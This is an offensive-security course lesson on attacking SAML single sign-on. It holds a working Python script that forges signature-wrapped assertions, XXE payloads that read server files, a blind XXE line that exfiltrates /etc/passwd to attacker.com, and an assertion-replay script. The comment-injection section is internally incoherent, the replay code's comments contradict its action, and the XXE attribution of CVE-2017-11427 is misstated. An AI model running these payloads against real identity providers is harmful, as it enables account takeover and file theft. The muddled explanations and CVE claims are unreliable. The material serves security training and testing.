---
title: "SAML Attacks — XML Signature Wrapping, XXE in SAML, Comment Injection"
tags: [SAML, XML-signature-wrapping, XXE, comment-injection, SSO, identity-provider,
       assertion-forgery, SAML-bypass, ATT&CK-T1550, CWE-345, CWE-611, CWE-295]
module: 04-BroadSurface-01
day: 173
related_topics:
  - OpenID Connect and SAML basics (Day 44)
  - OAuth Abuse Deep Dive (Day 171)
  - XXE fundamentals (Day 121)
  - Account Takeover Chains (Day 174)
---

# Day 173 — SAML Attacks

> "SAML is the enterprise standard for federated identity. It is 20 years old,
> XML-based, and the attack surface is exactly what you would expect from
> something that is 20 years old and XML-based. Signature wrapping has been
> known since 2008. It is still working in enterprise deployments in 2024.
> Know why it works. Know where to find it."
>
> — Ghost

---

## Goals

By the end of this lesson you will be able to:

1. Explain the SAML assertion structure and identify every security-critical
   field within it.
2. Execute an XML Signature Wrapping (XSW) attack to forge a SAML response
   with a valid signature but attacker-controlled content.
3. Inject XXE payloads into a SAML request to read server files or trigger
   SSRF.
4. Exploit comment injection in XML to bypass attribute-based authorisation.
5. Identify SAML vulnerabilities in a real application and write a finding
   report.

---

## Prerequisites

| Requirement | Reference |
|---|---|
| SAML basics — assertion structure, flows | Day 44 |
| XXE fundamentals | Day 121 |
| XML structure and namespaces | Day 44 |
| OAuth basics for comparison | Day 43 |

---

## SAML Architecture Review

SAML (Security Assertion Markup Language) enables SSO by having an **Identity
Provider (IdP)** issue digitally signed XML **assertions** that a **Service
Provider (SP)** trusts.

```
User → SP (service)    → "I need auth, go to IdP"
User → IdP (login)     → Authenticates user
IdP  → User            → Signed SAML Response (base64 in browser form)
User → SP              → POST SAMLResponse=<base64_encoded_XML>
SP   → Verifies sig    → "Valid. User is logged in as sub@domain.com"
```

**Decoded SAML Response (simplified):**

```xml
<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol">
  <saml:Assertion xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion"
                  ID="_assertion_001">
    <saml:Issuer>https://idp.example.com</saml:Issuer>
    <ds:Signature>
      <!-- Digital signature over the Assertion element -->
      <ds:SignedInfo>
        <ds:Reference URI="#_assertion_001"/>  <!-- Signs the Assertion with ID _assertion_001 -->
      </ds:SignedInfo>
      <ds:SignatureValue>BASE64...</ds:SignatureValue>
    </ds:Signature>
    <saml:Subject>
      <saml:NameID>alice@company.com</saml:NameID>
    </saml:Subject>
    <saml:AttributeStatement>
      <saml:Attribute Name="role">
        <saml:AttributeValue>user</saml:AttributeValue>
      </saml:Attribute>
    </saml:AttributeStatement>
  </saml:Assertion>
</samlp:Response>
```

**Security-critical fields:**
- `NameID` — the authenticated user identity
- `AttributeValue` — roles, permissions, group memberships
- `ds:Reference URI` — which element the signature covers
- `Conditions NotBefore/NotOnOrAfter` — validity window
- `InResponseTo` — replay protection

---

## Attack 1 — XML Signature Wrapping (XSW)

**What it is:** The XML digital signature validates a specific element by its
`ID` attribute. The `ds:Reference URI="#id"` field says "the signature covers
the element with id=`#id`." If the SP uses the signed element for identity but
processes the WRONG element (the unsigned one), the attacker can inject a
second assertion alongside the legitimate (signed) one.

**Root cause:** many SAML libraries process the *first* assertion found in the
XML tree rather than the one referenced in the `ds:Reference URI`.

### XSW Variants

There are 8 documented XSW variants (XSW1–XSW8), differing in where the
attacker-controlled assertion is placed relative to the signed one.

**XSW2 (most common):**

```xml
<samlp:Response>
  <!-- Attacker's unsigned assertion — processed first by vulnerable libraries -->
  <saml:Assertion ID="_malicious_001">
    <saml:NameID>admin@company.com</saml:NameID>
    <saml:Attribute Name="role">
      <saml:AttributeValue>admin</saml:AttributeValue>
    </saml:Attribute>
  </saml:Assertion>

  <!-- Original valid assertion — still correctly signed -->
  <saml:Assertion ID="_legitimate_001">
    <ds:Signature>
      <ds:Reference URI="#_legitimate_001"/>
      <ds:SignatureValue>VALID_SIG_FOR_ALICE...</ds:SignatureValue>
    </ds:Signature>
    <saml:NameID>alice@company.com</saml:NameID>
  </saml:Assertion>
</samlp:Response>
```

**What happens:**
- Signature verification: checks `#_legitimate_001` → valid
- Identity extraction: library reads the first `NameID` it finds → `admin@company.com`
- Result: SP thinks admin authenticated, signature is valid → access granted

### Manual XSW Step-by-Step

```python
import base64, gzip
from lxml import etree

# Step 1: Capture a legitimate SAML response (Burp intercept on POST to SP /saml/acs)
# Step 2: Base64-decode it
saml_b64 = "PASTE_BASE64_FROM_BURP_HERE"
saml_xml = base64.b64decode(saml_b64)

# Step 3: Parse the XML
root = etree.fromstring(saml_xml)
ns = {
    "saml": "urn:oasis:names:tc:SAML:2.0:assertion",
    "samlp": "urn:oasis:names:tc:SAML:2.0:protocol",
}

# Step 4: Find the legitimate assertion
orig_assertion = root.find(".//saml:Assertion", ns)
orig_id = orig_assertion.get("ID")

# Step 5: Create a clone with attacker-controlled identity
import copy
malicious = copy.deepcopy(orig_assertion)
malicious.set("ID", "_xsw_attack_001")
name_id = malicious.find("saml:Subject/saml:NameID", ns)
name_id.text = "admin@company.com"
role_attr = malicious.find(".//saml:AttributeValue", ns)
if role_attr is not None:
    role_attr.text = "admin"

# Remove the signature from the clone (it won't verify anyway)
sig = malicious.find("{http://www.w3.org/2000/09/xmldsig#}Signature")
if sig is not None:
    malicious.remove(sig)

# Step 6: Insert malicious assertion BEFORE the legitimate one
root.insert(list(root).index(orig_assertion), malicious)

# Step 7: Re-encode and submit
forged_xml = etree.tostring(root, xml_declaration=True, encoding="UTF-8")
forged_b64 = base64.b64encode(forged_xml).decode()
print(f"[+] Forged SAMLResponse (first 200 chars): {forged_b64[:200]}...")
```

**Tool:** `SAMLraider` Burp extension — automates all 8 XSW variants with one
click. Essential for testing SAML in bug bounty.

---

## Attack 2 — XXE in SAML

SAML responses are XML. If the SP's XML parser processes external entity
references, XXE applies. SAML is a natural target because:
- The SP receives user-controlled XML (the SAML response is user-controlled
  after IdP issues it — the user can modify it before posting)
- Some SPs use non-validating parsers that process DTDs

### 2.1 — Injecting XXE into a SAML Assertion

Intercept the SAMLResponse POST. Decode the base64. Add an XXE payload:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE Response [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol"
               xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion">
  <saml:Assertion>
    <saml:AttributeStatement>
      <saml:Attribute Name="email">
        <saml:AttributeValue>&xxe;</saml:AttributeValue>
      </saml:Attribute>
    </saml:AttributeStatement>
  </saml:Assertion>
</samlp:Response>
```

If the SP parses the DTD and reflects the `email` attribute in an error message
or profile page → `/etc/passwd` content disclosed.

### 2.2 — Blind XXE via SSRF in SAML

If there is no reflection, use out-of-band exfiltration:

```xml
<!DOCTYPE Response [
  <!ENTITY % data SYSTEM "file:///etc/passwd">
  <!ENTITY % oob SYSTEM "http://attacker.com/exfil?d=%data;">
  %oob;
]>
```

The SP's XML parser fetches `http://attacker.com/exfil?d=<contents of passwd>`.

**Real-world case:** CVE-2017-11427 (OneLogin python-saml) — XXE via SAML
assertion allowed reading server files. Patched by disabling external entity
resolution in the XML parser.

---

## Attack 3 — Comment Injection

Some SAML parsers handle XML comments differently from the XML canonical
form used for signature verification. An attacker can inject comments that
change how an identity or role attribute is parsed without invalidating the
existing signature.

### 3.1 — Username Comment Injection

**Original (signed) assertion:**

```xml
<saml:NameID>alice@company.com</saml:NameID>
```

**Modified with comment injection:**

```xml
<saml:NameID>al<!---->ice@company.com</saml:NameID>
```

If the canonical form used for signature verification treats `al<!---->ice` as
`alice` (stripping comments), but the identity extraction splits on `<!---->`,
the effective NameID becomes `al` — or the comment acts as a truncation point.

More dangerous variant — targeting admin boundary:

```xml
<saml:NameID>alice@company.com<!--admin-->@company.com</saml:NameID>
```

If the parser's normalisation strips comments and then takes the text before
the first `@`, the identity becomes `alice@company.com<!--admin-->` — which
might match `alice@company.com` in the user lookup, but carries the `admin`
string if the identity is processed differently.

**CVE-2017-11428 (Ruby-saml)** — comment injection in SAML NameID allowed
privilege escalation.

### 3.2 — Role Attribute Comment Injection

```xml
<saml:AttributeValue>user<!---->admin</saml:AttributeValue>
```

Some parsers' `text_content()` methods handle comments differently depending
on whether they strip or preserve comment nodes. If the application checks
`role.startswith("admin")` and the parser returns `admin` after stripping the
comment → escalation.

---

## Attack 4 — Assertion Replay

SAML assertions have a validity window defined by `NotBefore` and `NotOnOrAfter`
conditions. If the SP does not track which assertion IDs it has already
processed, a captured assertion can be replayed within its validity window.

```python
# A captured SAML response for alice
# Replay it as a different user by resubmitting the same SAMLResponse
# If SP does not check assertion ID for reuse:
import requests

saml_response = "CAPTURED_ALICE_SAML_RESPONSE_BASE64"
r = requests.post(
    "https://sp.target.com/saml/acs",
    data={"SAMLResponse": saml_response},
    allow_redirects=False,
)
# If 302 to /dashboard → replay successful → logged in as alice again
```

**Detection:** log `AssertionID` on every successful authentication. Reject
duplicate IDs within the validity window.

---

## SAML Security Checklist (Testing)

| Check | Test | Finding if fails |
|---|---|---|
| Signature validation | Remove `ds:Signature` element; submit | Unsigned assertions accepted |
| XSW (all 8 variants) | SAMLraider extension | Unsecured assertion used |
| XXE | Inject DOCTYPE with file:// entity | File read or SSRF |
| Comment injection | Inject `<!---->` in NameID | Identity manipulation |
| Replay protection | Resubmit captured assertion | Replay possible |
| Expiry check | Submit assertion with past `NotOnOrAfter` | Expired assertions accepted |
| Audience restriction | Submit assertion for different SP | Cross-SP token reuse |
| InResponseTo | Submit unsolicited assertion | SP accepts IdP-initiated without validation |

---

## Key Takeaways

1. **XSW works because the signed element and the processed element are
   different.** The signature covers element `#A`. The SP processes element
   `#B` (injected by the attacker). Both can coexist in the same XML document.
2. **SAML XXE is real and has had multiple CVEs.** Any XML parser processing
   SAML without `FEATURE_EXTERNAL_GENERAL_ENTITIES = False` is vulnerable.
3. **Comment injection exploits parser normalisation differences** between
   the canonicalisation used for signing and the text extraction used for
   identity. Always test with `<!---->` in NameID and role attributes.
4. **SAMLraider + Burp Suite is the standard toolchain** for SAML testing.
   It handles base64 encoding/decoding, XSW variants, and resigned assertions
   automatically.
5. **SAML vulnerabilities appear in enterprise targets** — financial services,
   healthcare, government contractors. These are high-value bug bounty targets
   with large scope.

---

## Exercises

1. Install the SAMLraider Burp extension. Set up a local SAML SP (SimpleSAMLphp
   or Spring SAML). Run all 8 XSW variants. Which ones succeed against a
   default configuration?
2. Intercept a SAML response from a test IdP. Manually inject an XXE payload
   and submit it to the SP. Use a Burp Collaborator payload to test for out-of-
   band XXE if there is no inline reflection.
3. Find a publicly disclosed CVE involving SAML signature wrapping from
   2015–2024. Identify: affected product, XSW variant used, patch.
4. Write a Sigma rule that detects SAML replay attacks by alerting on
   duplicate `InResponseTo` values in successful SAML authentication events.

---

## Questions

> Add your questions here. Each question gets a Global ID (Q173.1, Q173.2 …).
> Follow-up questions use hierarchical numbering (Q173.1.1, Q173.1.2 …).

---

## Navigation

← Previous: [Day 172 — OAuth Attack Lab](DAY-0172-OAuth-Attack-Lab.md)
→ Next: [Day 174 — Account Takeover Chains](DAY-0174-Account-Takeover-Chains.md)
